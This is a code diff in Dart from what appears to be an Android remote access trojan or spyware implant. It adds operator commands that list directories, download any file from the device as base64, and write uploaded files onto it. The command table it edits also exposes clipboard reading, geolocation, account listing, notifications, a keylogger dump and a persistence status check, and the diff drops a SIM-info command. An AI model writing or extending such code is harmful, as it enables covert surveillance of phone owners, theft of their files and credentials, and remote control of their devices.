@@ -121,10 +121,11 @@ Future<Map<String, dynamic>> cmdClipboard(Map<String, dynamic> args) async {
   return NativeHost.invoke('clipboardRead');
 }
 
-Future<Map<String, dynamic>> cmdFiles(Map<String, dynamic> args) async {
+Future<Map<String, dynamic>> cmdFsLs(Map<String, dynamic> args) async {
   final path = (args['path'] ?? '/sdcard').toString();
   try {
-    return await NativeHost.invoke('listDir', {'path': path});
+    final r = await NativeHost.invoke('listDir', {'path': path});
+    return {...r, 'cwd': path};
   } catch (_) {
     final dir = Directory(path);
     if (!await dir.exists()) throw Exception('path not found: $path');
@@ -139,16 +140,65 @@ Future<Map<String, dynamic>> cmdFiles(Map<String, dynamic> args) async {
       });
       if (ents.length >= 200) break;
     }
-    return {'path': path, 'entries': ents};
+    return {'path': path, 'cwd': path, 'entries': ents};
   }
 }
 
-Future<Map<String, dynamic>> cmdAccounts(Map<String, dynamic> args) async {
-  return NativeHost.invoke('listAccounts');
+/// Change directory — validates path exists and is a directory, returns new cwd listing.
+Future<Map<String, dynamic>> cmdFsCd(Map<String, dynamic> args) async {
+  var path = (args['path'] ?? '/sdcard').toString();
+  if (path.isEmpty) path = '/sdcard';
+  // normalize trailing slash except root
+  if (path.length > 1 && path.endsWith('/')) path = path.substring(0, path.length - 1);
+  final listed = await cmdFsLs({'path': path});
+  return {'cwd': path, 'path': path, 'entries': listed['entries'] ?? []};
 }
 
-Future<Map<String, dynamic>> cmdSim(Map<String, dynamic> args) async {
-  return NativeHost.invoke('simInfo');
+/// Download a file from the device (base64) for the operator.
+Future<Map<String, dynamic>> cmdFsDownload(Map<String, dynamic> args) async {
+  final path = (args['path'] ?? '').toString();
+  if (path.isEmpty) throw Exception('path required');
+  try {
+    return await NativeHost.invoke('readFile', {'path': path});
+  } catch (_) {
+    final f = File(path);
+    if (!await f.exists()) throw Exception('file not found: $path');
+    final bytes = await f.readAsBytes();
+    if (bytes.length > 12 * 1024 * 1024) {
+      throw Exception('file too large (>12MB)');
+    }
+    return {
+      'path': path,
+      'name': f.uri.pathSegments.isNotEmpty ? f.uri.pathSegments.last : path,
+      'size': bytes.length,
+      'b64': base64Encode(bytes),
+      'mime': 'application/octet-stream',
+    };
+  }
+}
+
+/// Upload a file to the device from operator (base64 body).
+Future<Map<String, dynamic>> cmdFsUpload(Map<String, dynamic> args) async {
+  final path = (args['path'] ?? '').toString();
+  final b64 = (args['b64'] ?? args['data'] ?? '').toString();
+  if (path.isEmpty) throw Exception('path required');
+  if (b64.isEmpty) throw Exception('b64 required');
+  try {
+    return await NativeHost.invoke('writeFile', {'path': path, 'b64': b64});
+  } catch (_) {
+    final bytes = base64Decode(b64);
+    final f = File(path);
+    await f.parent.create(recursive: true);
+    await f.writeAsBytes(bytes, flush: true);
+    return {'path': path, 'size': bytes.length, 'written': true};
+  }
+}
+
+// Back-compat alias
+Future<Map<String, dynamic>> cmdFiles(Map<String, dynamic> args) => cmdFsLs(args);
+
+Future<Map<String, dynamic>> cmdAccounts(Map<String, dynamic> args) async {
+  return NativeHost.invoke('listAccounts');
 }
 
 Future<Map<String, dynamic>> cmdNotifications(Map<String, dynamic> args) async {
@@ -185,8 +235,11 @@ final Map<String, JobHandler> kHandlers = {
   'geoloc': cmdGeoloc,
   'clipboard': cmdClipboard,
   'files': cmdFiles,
+  'fs_ls': cmdFsLs,
+  'fs_cd': cmdFsCd,
+  'fs_download': cmdFsDownload,
+  'fs_upload': cmdFsUpload,
   'accounts': cmdAccounts,
-  'sim': cmdSim,
   'notifications': cmdNotifications,
   'keylog_dump': cmdKeylogDump,
   'persist_status': cmdPersistStatus,
